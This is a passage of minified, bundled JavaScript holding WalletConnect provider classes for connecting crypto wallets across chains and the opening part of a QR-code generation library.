wZe=Object.defineProperty,bZe=Object.defineProperties,vZe=Object.getOwnPropertyDescriptors,EH=Object.getOwnPropertySymbols,yZe=Object.prototype.hasOwnProperty,xZe=Object.prototype.propertyIsEnumerable,YN=(r,e,t)=>e in r?wZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,x8=(r,e)=>{for(var t in e||(e={}))yZe.call(e,t)&&YN(r,t,e[t]);if(EH)for(var t of EH(e))xZe.call(e,t)&&YN(r,t,e[t]);return r},CI=(r,e)=>bZe(r,vZe(e)),Uc=(r,e,t)=>YN(r,typeof e!="symbol"?e+"":e,t);let CZe=class Nie{constructor(e){Uc(this,"client"),Uc(this,"namespaces"),Uc(this,"optionalNamespaces"),Uc(this,"sessionProperties"),Uc(this,"scopedProperties"),Uc(this,"events",new T0),Uc(this,"rpcProviders",{}),Uc(this,"session"),Uc(this,"providerOpts"),Uc(this,"logger"),Uc(this,"uri"),Uc(this,"disableProviderPing",!1),this.providerOpts=e,this.logger=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||sH})),this.disableProviderPing=e?.disableProviderPing||!1}static async init(e){const t=new Nie(e);return await t.initialize(),t}async request(e,t,i){const[n,s]=this.validateChain(t);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(n).request({request:x8({},e),chainId:`${n}:${s}`,topic:this.session.topic,expiry:i})}sendAsync(e,t,i,n){const s=new Date().getTime();this.request(e,i,n).then(o=>t(null,bl(s,o))).catch(o=>t(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:gn("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,t){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:i,response:n}=await this.client.authenticate(e,t);i&&(this.uri=i,this.events.emit("display_uri",i));const s=await n();if(this.session=s.session,this.session){const o=pH(this.session.namespaces);this.namespaces=y8(this.namespaces,o),await this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}removeListener(e,t){this.events.removeListener(e,t)}off(e,t){this.events.off(e,t)}get isWalletConnect(){return!0}async pair(e){const{uri:t,approval:i}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties});t&&(this.uri=t,this.events.emit("display_uri",t));const n=await i();this.session=n;const s=pH(n.namespaces);return this.namespaces=y8(this.namespaces,s),await this.persist("namespaces",this.namespaces),await this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,t){try{if(!this.session)return;const[i,n]=this.validateChain(e),s=this.getProvider(i);s.name===Um?s.setDefaultChain(`${i}:${n}`,t):s.setDefaultChain(n,t)}catch(i){if(!/Please call connect/.test(i.message))throw i}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const t=this.client.pairing.getAll();if(il(t)){for(const i of t)e.deletePairings?this.client.core.expirer.set(i.topic,0):await this.client.core.relayer.subscriber.unsubscribe(i.topic);this.logger.info(`Inactive pairings cleared: ${t.length}`)}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,t;if(this.client=this.providerOpts.client||await WKe.init({core:this.providerOpts.core,logger:this.providerOpts.logger||sH,relayUrl:this.providerOpts.relayUrl||HKe,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(i){throw this.logger.error("Failed to get session",i),new Error(`The provided session: ${(t=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:t.topic} doesn't exist in the Sign client`)}else{const i=this.client.session.getAll();this.session=i[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(t=>Gm(t)))];yI("client",this.client),yI("events",this.events),yI("disableProviderPing",this.disableProviderPing),e.forEach(t=>{if(!this.session)return;const i=TGe(t,this.session);if(i?.length===0)return;const n=Tie(i),s=y8(this.namespaces,this.optionalNamespaces),o=CI(x8({},s[t]),{accounts:i,chains:n});switch(t){case"eip155":this.rpcProviders[t]=new zGe({namespace:o});break;case"algorand":this.rpcProviders[t]=new QGe({namespace:o});break;case"solana":this.rpcProviders[t]=new VGe({namespace:o});break;case"cosmos":this.rpcProviders[t]=new ZGe({namespace:o});break;case"polkadot":this.rpcProviders[t]=new DGe({namespace:o});break;case"cip34":this.rpcProviders[t]=new tZe({namespace:o});break;case"elrond":this.rpcProviders[t]=new nZe({namespace:o});break;case"multiversx":this.rpcProviders[t]=new aZe({namespace:o});break;case"near":this.rpcProviders[t]=new uZe({namespace:o});break;case"tezos":this.rpcProviders[t]=new fZe({namespace:o});break;default:this.rpcProviders[Um]?this.rpcProviders[Um].updateNamespace(o):this.rpcProviders[Um]=new mZe({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var t;const{topic:i}=e;i===((t=this.session)==null?void 0:t.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var t;const{params:i,topic:n}=e;if(n!==((t=this.session)==null?void 0:t.topic))return;const{event:s}=i;if(s.name==="accountsChanged"){const o=s.data;o&&il(o)&&this.events.emit("accountsChanged",o.map(fH))}else if(s.name==="chainChanged"){const o=i.chainId,a=i.event.data,c=Gm(o),l=vI(o)!==vI(a)?`${c}:${vI(a)}`:o;this.onChainChanged(l)}else this.events.emit(s.name,s.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:t})=>{var i,n;if(e!==((i=this.session)==null?void 0:i.topic))return;const{namespaces:s}=t,o=(n=this.client)==null?void 0:n.session.get(e);this.session=CI(x8({},o),{namespaces:s}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:t})}),this.client.on("session_delete",async e=>{var t;e.topic===((t=this.session)==null?void 0:t.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",CI(x8({},gn("USER_DISCONNECTED")),{data:e.topic})))}),this.on(El.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[Um]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var t;this.getProvider(e).updateNamespace((t=this.session)==null?void 0:t.namespaces[e])})}setNamespaces(e){const{namespaces:t={},optionalNamespaces:i={},sessionProperties:n,scopedProperties:s}=e;this.optionalNamespaces=y8(t,i),this.sessionProperties=n,this.scopedProperties=s}validateChain(e){const[t,i]=e?.split(":")||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[t,i];if(t&&!Object.keys(this.namespaces||{}).map(o=>Gm(o)).includes(t))throw new Error(`Namespace '${t}' is not configured. Please call connect() first with namespace config.`);if(t&&i)return[t,i];const n=Gm(Object.keys(this.namespaces)[0]),s=this.rpcProviders[n].getDefaultChain();return[n,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged(e,t=!1){if(!this.namespaces)return;const[i,n]=this.validateChain(e);if(!n)return;this.updateNamespaceChain(i,n),this.events.emit("chainChanged",n);const s=this.getProvider(i).getDefaultChain();t||this.getProvider(i).setDefaultChain(n),this.emitAccountsChangedOnChainChange({namespace:i,previousChainId:s,newChainId:e}),await this.persist("namespaces",this.namespaces)}emitAccountsChangedOnChainChange({namespace:e,previousChainId:t,newChainId:i}){var n,s;try{if(t===i)return;const o=(s=(n=this.session)==null?void 0:n.namespaces[e])==null?void 0:s.accounts;if(!o)return;const a=o.filter(c=>c.includes(`${i}:`)).map(fH);if(!il(a))return;this.events.emit("accountsChanged",a)}catch(o){this.logger.warn("Failed to emit accountsChanged on chain change",o)}}updateNamespaceChain(e,t){if(!this.namespaces)return;const i=this.namespaces[e]?e:`${e}:${t}`,n={chains:[],methods:[],events:[],defaultChain:t};this.namespaces[i]?this.namespaces[i]&&(this.namespaces[i].defaultChain=t):this.namespaces[i]=n}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,await this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,t){var i;const n=((i=this.session)==null?void 0:i.topic)||"";await this.client.core.storage.setItem(`${b8}/${e}${n}`,t)}async getFromStore(e){var t;const i=((t=this.session)==null?void 0:t.topic)||"";return await this.client.core.storage.getItem(`${b8}/${e}${i}`)}async deleteFromStore(e){var t;const i=((t=this.session)==null?void 0:t.topic)||"";await this.client.core.storage.removeItem(`${b8}/${e}${i}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const t=await this.client.core.storage.getKeys();for(const i of t)i.startsWith(b8)&&await this.client.core.storage.removeItem(i)}catch(t){this.logger.warn("Failed to cleanup storage",t)}}};const EZe=CZe,_Ze="wc",SZe="ethereum_provider",AZe=`${_Ze}@2:${SZe}:`,IZe="https://rpc.walletconnect.org/v1/",JN=["eth_sendTransaction","personal_sign"],TZe=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_sendCalls","wallet_getCapabilities","wallet_getCallsStatus","wallet_showCallsStatus"],QN=["chainChanged","accountsChanged"],kZe=["chainChanged","accountsChanged","message","disconnect","connect"],NZe=async()=>{const{createAppKit:r}=await Ke(()=>Promise.resolve().then(()=>Jdt),void 0);return r};var PZe=Object.defineProperty,$Ze=Object.defineProperties,RZe=Object.getOwnPropertyDescriptors,_H=Object.getOwnPropertySymbols,OZe=Object.prototype.hasOwnProperty,BZe=Object.prototype.propertyIsEnumerable,XN=(r,e,t)=>e in r?PZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,r1=(r,e)=>{for(var t in e||(e={}))OZe.call(e,t)&&XN(r,t,e[t]);if(_H)for(var t of _H(e))BZe.call(e,t)&&XN(r,t,e[t]);return r},Lb=(r,e)=>$Ze(r,RZe(e)),Za=(r,e,t)=>XN(r,typeof e!="symbol"?e+"":e,t);function tx(r){return Number(r[0].split(":")[1])}function C8(r){return`0x${r.toString(16)}`}function MZe(r){const{chains:e,optionalChains:t,methods:i,optionalMethods:n,events:s,optionalEvents:o,rpcMap:a}=r;if(!il(e))throw new Error("Invalid chains");const c={chains:e,methods:i||JN,events:s||QN,rpcMap:r1({},e.length?{[tx(e)]:a[tx(e)]}:{})},l=s?.filter(f=>!QN.includes(f)),u=i?.filter(f=>!JN.includes(f));if(!t&&!o&&!n&&!(l!=null&&l.length)&&!(u!=null&&u.length))return{required:e.length?c:void 0};const d=l?.length&&u?.length||!t,h={chains:[...new Set(d?c.chains.concat(t||[]):t)],methods:[...new Set(c.methods.concat(n!=null&&n.length?n:TZe))],events:[...new Set(c.events.concat(o!=null&&o.length?o:kZe))],rpcMap:a};return{required:e.length?c:void 0,optional:t.length?h:void 0}}let DZe=class Pie{constructor(){Za(this,"events",new en.EventEmitter),Za(this,"namespace","eip155"),Za(this,"accounts",[]),Za(this,"signer"),Za(this,"chainId",1),Za(this,"modal"),Za(this,"rpc"),Za(this,"STORAGE_KEY",AZe),Za(this,"on",(e,t)=>(this.events.on(e,t),this)),Za(this,"once",(e,t)=>(this.events.once(e,t),this)),Za(this,"removeListener",(e,t)=>(this.events.removeListener(e,t),this)),Za(this,"off",(e,t)=>(this.events.off(e,t),this)),Za(this,"parseAccount",e=>this.isCompatibleChainId(e)?this.parseAccountId(e).address:e),this.signer={},this.rpc={}}static async init(e){const t=new Pie;return await t.initialize(e),t}async request(e,t){return await this.signer.request(e,this.formatChainId(this.chainId),t)}sendAsync(e,t,i){this.signer.sendAsync(e,t,this.formatChainId(this.chainId),i)}get connected(){return this.signer.client?this.signer.client.core.relayer.connected:!1}get connecting(){return this.signer.client?this.signer.client.core.relayer.connecting:!1}async enable(){return this.session||await this.connect(),await this.request({method:"eth_requestAccounts"})}async connect(e){var t;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts(e);const{required:i,optional:n}=MZe(this.rpc);try{const s=await new Promise(async(a,c)=>{var l,u;this.rpc.showQrModal&&((l=this.modal)==null||l.open(),(u=this.modal)==null||u.subscribeState(h=>{!h.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),c(new Error("Connection request reset. Please try again.")))}));const d=e!=null&&e.scopedProperties?{[this.namespace]:e.scopedProperties}:void 0;await this.signer.connect(Lb(r1({namespaces:r1({},i&&{[this.namespace]:i})},n&&{optionalNamespaces:{[this.namespace]:n}}),{pairingTopic:e?.pairingTopic,scopedProperties:d})).then(h=>{a(h)}).catch(h=>{var f;(f=this.modal)==null||f.showErrorMessage("Unable to connect"),c(new Error(h.message))})});if(!s)return;const o=Bz(s.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:o),this.setAccounts(o),this.events.emit("connect",{chainId:C8(this.chainId)})}catch(s){throw this.signer.logger.error(s),s}finally{(t=this.modal)==null||t.close()}}async authenticate(e,t){var i;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts({chains:e?.chains});try{const n=await new Promise(async(o,a)=>{var c,l;this.rpc.showQrModal&&((c=this.modal)==null||c.open(),(l=this.modal)==null||l.subscribeState(u=>{!u.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),a(new Error("Connection request reset. Please try again.")))})),await this.signer.authenticate(Lb(r1({},e),{chains:this.rpc.chains}),t).then(u=>{o(u)}).catch(u=>{var d;(d=this.modal)==null||d.showErrorMessage("Unable to connect"),a(new Error(u.message))})}),s=n.session;if(s){const o=Bz(s.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:o),this.setAccounts(o),this.events.emit("connect",{chainId:C8(this.chainId)})}return n}catch(n){throw this.signer.logger.error(n),n}finally{(i=this.modal)==null||i.close()}}async disconnect(){this.session&&await this.signer.disconnect(),this.reset()}get isWalletConnect(){return!0}get session(){return this.signer.session}registerEventListeners(){this.signer.on("session_event",e=>{const{params:t}=e,{event:i}=t;i.name==="accountsChanged"?(this.accounts=this.parseAccounts(i.data),this.events.emit("accountsChanged",this.accounts)):i.name==="chainChanged"?this.setChainId(this.formatChainId(i.data)):this.events.emit(i.name,i.data),this.events.emit("session_event",e)}),this.signer.on("accountsChanged",e=>{this.accounts=this.parseAccounts(e),this.events.emit("accountsChanged",this.accounts)}),this.signer.on("chainChanged",e=>{const t=parseInt(e);this.chainId=t,this.events.emit("chainChanged",C8(this.chainId)),this.persist()}),this.signer.on("session_update",e=>{this.events.emit("session_update",e)}),this.signer.on("session_delete",e=>{this.reset(),this.events.emit("session_delete",e),this.events.emit("disconnect",Lb(r1({},gn("USER_DISCONNECTED")),{data:e.topic,name:"USER_DISCONNECTED"}))}),this.signer.on("display_uri",e=>{this.events.emit("display_uri",e)})}switchEthereumChain(e){this.request({method:"wallet_switchEthereumChain",params:[{chainId:e.toString(16)}]})}isCompatibleChainId(e){return typeof e=="string"?e.startsWith(`${this.namespace}:`):!1}formatChainId(e){return`${this.namespace}:${e}`}parseChainId(e){return Number(e.split(":")[1])}setChainIds(e){const t=e.filter(i=>this.isCompatibleChainId(i)).map(i=>this.parseChainId(i));t.length&&(this.chainId=t[0],this.events.emit("chainChanged",C8(this.chainId)),this.persist())}setChainId(e){if(this.isCompatibleChainId(e)){const t=this.parseChainId(e);this.chainId=t,this.switchEthereumChain(t)}}parseAccountId(e){const[t,i,n]=e.split(":");return{chainId:`${t}:${i}`,address:n}}setAccounts(e){this.accounts=e.filter(t=>this.parseChainId(this.parseAccountId(t).chainId)===this.chainId).map(t=>this.parseAccountId(t).address),this.events.emit("accountsChanged",this.accounts)}getRpcConfig(e){var t,i;const n=(t=e?.chains)!=null?t:[],s=(i=e?.optionalChains)!=null?i:[],o=n.concat(s);if(!o.length)throw new Error("No chains specified in either `chains` or `optionalChains`");const a=n.length?e?.methods||JN:[],c=n.length?e?.events||QN:[],l=e?.optionalMethods||[],u=e?.optionalEvents||[],d=e?.rpcMap||this.buildRpcMap(o,e.projectId),h=e?.qrModalOptions||void 0;return{chains:n?.map(f=>this.formatChainId(f)),optionalChains:s.map(f=>this.formatChainId(f)),methods:a,events:c,optionalMethods:l,optionalEvents:u,rpcMap:d,showQrModal:!!(e!=null&&e.showQrModal),qrModalOptions:h,projectId:e.projectId,metadata:e.metadata}}buildRpcMap(e,t){const i={};return e.forEach(n=>{i[n]=this.getRpcUrl(n,t)}),i}async initialize(e){if(this.rpc=this.getRpcConfig(e),this.chainId=this.rpc.chains.length?tx(this.rpc.chains):tx(this.rpc.optionalChains),this.signer=await EZe.init({projectId:this.rpc.projectId,metadata:this.rpc.metadata,disableProviderPing:e.disableProviderPing,relayUrl:e.relayUrl,storage:e.storage,storageOptions:e.storageOptions,customStoragePrefix:e.customStoragePrefix,telemetryEnabled:e.telemetryEnabled,logger:e.logger}),this.registerEventListeners(),await this.loadPersistedSession(),this.rpc.showQrModal){let t;try{const i=await NZe(),{convertWCMToAppKitOptions:n}=await Promise.resolve().then(function(){return KZe}),s=n(Lb(r1({},this.rpc.qrModalOptions),{chains:[...new Set([...this.rpc.chains,...this.rpc.optionalChains])],metadata:this.rpc.metadata,projectId:this.rpc.projectId}));if(!s.networks.length)throw new Error("No networks found for WalletConnect");t=i(Lb(r1({},s),{universalProvider:this.signer,manualWCControl:!0}))}catch(i){throw console.warn(i),new Error("To use QR modal, please install @reown/appkit package")}if(t)try{this.modal=t}catch(i){throw this.signer.logger.error(i),new Error("Could not generate WalletConnectModal Instance")}}}loadConnectOpts(e){if(!e)return;const{chains:t,optionalChains:i,rpcMap:n}=e;t&&il(t)&&(this.rpc.chains=t.map(s=>this.formatChainId(s)),t.forEach(s=>{this.rpc.rpcMap[s]=n?.[s]||this.getRpcUrl(s)})),i&&il(i)&&(this.rpc.optionalChains=[],this.rpc.optionalChains=i?.map(s=>this.formatChainId(s)),i.forEach(s=>{this.rpc.rpcMap[s]=n?.[s]||this.getRpcUrl(s)}))}getRpcUrl(e,t){var i;return((i=this.rpc.rpcMap)==null?void 0:i[e])||`${IZe}?chainId=eip155:${e}&projectId=${t||this.rpc.projectId}`}async loadPersistedSession(){if(this.session)try{const e=await this.signer.client.core.storage.getItem(`${this.STORAGE_KEY}/chainId`),t=this.session.namespaces[`${this.namespace}:${e}`]?this.session.namespaces[`${this.namespace}:${e}`]:this.session.namespaces[this.namespace];this.setChainIds(e?[this.formatChainId(e)]:t?.accounts),this.setAccounts(t?.accounts)}catch(e){this.signer.logger.error("Failed to load persisted session, clearing state..."),this.signer.logger.error(e),await this.disconnect().catch(t=>this.signer.logger.warn(t))}}reset(){this.chainId=1,this.accounts=[]}persist(){this.session&&this.signer.client.core.storage.setItem(`${this.STORAGE_KEY}/chainId`,this.chainId)}parseAccounts(e){return typeof e=="string"||e instanceof String?[this.parseAccount(e)]:e.map(t=>this.parseAccount(t))}};const q3=DZe;var LZe=Object.defineProperty,UZe=Object.defineProperties,jZe=Object.getOwnPropertyDescriptors,SH=Object.getOwnPropertySymbols,FZe=Object.prototype.hasOwnProperty,qZe=Object.prototype.propertyIsEnumerable,AH=(r,e,t)=>e in r?LZe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,$ie=(r,e)=>{for(var t in e||(e={}))FZe.call(e,t)&&AH(r,t,e[t]);if(SH)for(var t of SH(e))qZe.call(e,t)&&AH(r,t,e[t]);return r},zZe=(r,e)=>UZe(r,jZe(e));function WZe(r){if(r)return{"--w3m-font-family":r["--wcm-font-family"],"--w3m-accent":r["--wcm-accent-color"],"--w3m-color-mix":r["--wcm-background-color"],"--w3m-z-index":r["--wcm-z-index"]?Number(r["--wcm-z-index"]):void 0,"--w3m-qr-color":r["--wcm-accent-color"],"--w3m-font-size-master":r["--wcm-text-medium-regular-size"],"--w3m-border-radius-master":r["--wcm-container-border-radius"],"--w3m-color-mix-strength":0}}const HZe=r=>{const[e,t]=r.split(":");return Rie({id:t,caipNetworkId:r,chainNamespace:e,name:"",nativeCurrency:{name:"",symbol:"",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}})};function VZe(r){var e,t,i,n,s,o,a;const c=(e=r.chains)==null?void 0:e.map(HZe).filter(Boolean);if(c.length===0)throw new Error("At least one chain must be specified");const l=c.find(d=>{var h;return d.id===((h=r.defaultChain)==null?void 0:h.id)}),u={projectId:r.projectId,networks:c,themeMode:r.themeMode,themeVariables:WZe(r.themeVariables),chainImages:r.chainImages,connectorImages:r.walletImages,defaultNetwork:l,metadata:zZe($ie({},r.metadata),{name:((t=r.metadata)==null?void 0:t.name)||"WalletConnect",description:((i=r.metadata)==null?void 0:i.description)||"Connect to WalletConnect-compatible wallets",url:((n=r.metadata)==null?void 0:n.url)||"https://walletconnect.org",icons:((s=r.metadata)==null?void 0:s.icons)||["https://walletconnect.org/walletconnect-logo.png"]}),showWallets:!0,featuredWalletIds:r.explorerRecommendedWalletIds==="NONE"?[]:Array.isArray(r.explorerRecommendedWalletIds)?r.explorerRecommendedWalletIds:[],excludeWalletIds:r.explorerExcludedWalletIds==="ALL"?[]:Array.isArray(r.explorerExcludedWalletIds)?r.explorerExcludedWalletIds:[],enableEIP6963:!1,enableInjected:!1,enableCoinbase:!0,enableWalletConnect:!0,features:{email:!1,socials:!1}};if((o=r.mobileWallets)!=null&&o.length||(a=r.desktopWallets)!=null&&a.length){const d=[...(r.mobileWallets||[]).map(p=>({id:p.id,name:p.name,links:p.links})),...(r.desktopWallets||[]).map(p=>({id:p.id,name:p.name,links:{native:p.links.native,universal:p.links.universal}}))],h=[...u.featuredWalletIds||[],...u.excludeWalletIds||[]],f=d.filter(p=>!h.includes(p.id));f.length&&(u.customWallets=f)}return u}function Rie(r){return $ie({formatters:void 0,fees:void 0,serializers:void 0},r)}var KZe=Object.freeze({__proto__:null,convertWCMToAppKitOptions:VZe,defineChain:Rie}),om={},EI,IH;function GZe(){return IH||(IH=1,EI=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then}),EI}var _I={},cf={},TH;function _2(){if(TH)return cf;TH=1;let r;const e=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];return cf.getSymbolSize=function(i){if(!i)throw new Error('"version" cannot be null or undefined');if(i<1||i>40)throw new Error('"version" should be in range from 1 to 40');return i*4+17},cf.getSymbolTotalCodewords=function(i){return e[i]},cf.getBCHDigit=function(t){let i=0;for(;t!==0;)i++,t>>>=1;return i},cf.setToSJISFunction=function(i){if(typeof i!="function")throw new Error('"toSJISFunc" is not a valid function.');r=i},cf.isKanjiModeEnabled=function(){return typeof r<"u"},cf.toSJIS=function(i){return r(i)},cf}var SI={},kH;function MO(){return kH||(kH=1,function(r){r.L={bit:1},r.M={bit:0},r.Q={bit:3},r.H={bit:2};function e(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return r.L;case"m":case"medium":return r.M;case"q":case"quartile":return r.Q;case"h":case"high":return r.H;default:throw new Error("Unknown EC Level: "+t)}}r.isValid=function(i){return i&&typeof i.bit<"u"&&i.bit>=0&&i.bit<4},r.from=function(i,n){if(r.isValid(i))return i;try{return e(i)}catch{return n}}}(SI)),SI}var AI,NH;function ZZe(){if(NH)return AI;NH=1;function r(){this.buffer=[],this.length=0}return r.prototype={get:function(e){const t=Math.floor(e/8);return(this.buffer[t]>>>7-e%8&1)===1},put:function(e,t){for(let i=0;i<t;i++)this.putBit((e>>>t-i-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(e){const t=Math.floor(this.length/8);this.buffer.length<=t&&this.buffer.push(0),e&&(this.buffer[t]|=128>>>this.length%8),this.length++}},AI=r,AI}var II,PH;function YZe(){if(PH)return II;PH=1;function r(e){if(!e||e<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=e,this.data=new Uint8Array(e*e),this.reservedBit=new Uint8Array(e*e)}return r.prototype.set=function(e,t,i,n){const s=e*this.size+t;this.data[s]=i,n&&(this.reservedBit[s]=!0)},r.prototype.get=function(e,t){return this.data[e*this.size+t]},r.prototype.xor=function(e,t,i){this.data[e*this.size+t]^=i},r.prototype.isReserved=function(e,t){return this.reservedBit[e*this.size+t]},II=r,II}var TI={},$H;function JZe(){return $H||($H=1,function(r){const e=_2().getSymbolSize;r.getRowColCoords=function(i){if(i===1)return[];const n=Math.floor(i/7)+2,s=e(i),o=s===145?26:Math.ceil((s-13)/(2*n-2))*2,a=[s-7];for(let c=1;c<n-1;c++)a[c]=a[c-1]-o;return a.push(6),a.reverse()},r.getPositions=function(i){const n=[],s=r.getRowColCoords(i),o=s.length;for(let a=0;a<o;a++)for(let c=0;c<o;c++)a===0&&c===0||a===0&&c===o-1||a===o-1&&c===0||n.push([s[a],s[c]]);return n}}(TI)),TI}var kI={},RH;function QZe(){if(RH)return kI;RH=1;const r=_2().getSymbolSize,e=7;return kI.getPositions=function(i){const n=r(i);return[[0,0],[n-e,0],[0,n-e]]},kI}var NI={},OH;function XZe(){return OH||(OH=1,function(r){r.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};r.isValid=function(n){return n!=null&&n!==""&&!isNaN(n)&&n>=0&&n<=7},r.from=function(n){return r.isValid(n)?parseInt(n,10):void 0},r.getPenaltyN1=function(n){const s=n.size;let o=0,a=0,c=0,l=null,u=null;for(let d=0;d<s;d++){a=c=0,l=u=null;for(let h=0;h<s;h++){let f=n.get(d,h);f===l?a++:(a>=5&&(o+=e.N1+(a-5)),l=f,a=1),f=n.get(h,d),f===u?c++:(c>=5&&(o+=e.N1+(c-5)),u=f,c=1)}a>=5&&(o+=e.N1+(a-5)),c>=5&&(o+=e.N1+(c-5))}return o},r.getPenaltyN2=function(n){const s=n.size;let o=0;for(let a=0;a<s-1;a++)for(let c=0;c<s-1;c++){const l=n.get(a,c)+n.get(a,c+1)+n.get(a+1,c)+n.get(a+1,c+1);(l===4||l===0)&&o++}return o*e.N2},r.getPenaltyN3=function(n){const s=n.size;let o=0,a=0,c=0;for(let l=0;l<s;l++){a=c=0;for(let u=0;u<s;u++)a=a<<1&2047|n.get(l,u),u>=10&&(a===1488||a===93)&&o++,c=c<<1&2047|n.get(u,l),u>=10&&(c===1488||c===93)&&o++}return o*e.N3},r.getPenaltyN4=function(n){let s=0;const o=n.data.length;for(let c=0;c<o;c++)s+=n.data[c];return Math.abs(Math.ceil(s*100/o/5)-10)*e.N4};function t(i,n,s){switch(i){case r.Patterns.PATTERN000:return(n+s)%2===0;case r.Patterns.PATTERN001:return n%2===0;case r.Patterns.PATTERN010:return s%3===0;case r.Patterns.PATTERN011:return(n+s)%3===0;case r.Patterns.PATTERN100:return(Math.floor(n/2)+Math.floor(s/3))%2===0;case r.Patterns.PATTERN101:return n*s%2+n*s%3===0;case r.Patterns.PATTERN110:return(n*s%2+n*s%3)%2===0;case r.Patterns.PATTERN111:return(n*s%3+(n+s)%2)%2===0;default:throw new Error("bad maskPattern:"+i)}}r.applyMask=function(n,s){const o=s.size;for(let a=0;a<o;a++)for(let c=0;c<o;c++)s.isReserved(c,a)||s.xor(c,a,t(n,c,a))},r.getBestMask=function(n,s){const o=Object.keys(r.Patterns).length;let a=0,c=1/0;for(let l=0;l<o;l++){s(l),r.applyMask(l,n);const u=r.getPenaltyN1(n)+r.getPenaltyN2(n)+r.getPenaltyN3(n)+r.getPenaltyN4(n);r.applyMask(l,n),u<c&&(c=u,a=l)}return a}}(NI)),NI}var E8={},BH;function Oie(){if(BH)return E8;BH=1;const 